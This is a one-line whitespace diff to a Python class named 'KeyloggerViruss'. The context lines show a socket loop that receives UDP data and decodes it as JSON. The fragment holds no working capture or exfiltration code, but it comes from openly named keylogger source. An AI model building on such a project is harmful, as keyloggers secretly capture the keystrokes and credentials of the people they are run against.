@@ -97,6 +97,7 @@ class KeyloggerViruss():
                     if not self.is_active_server:
                         self.start_session()
 
+
                     data, _ = sock.recvfrom(buffer_size)
                     data = json.loads(data.decode())
 
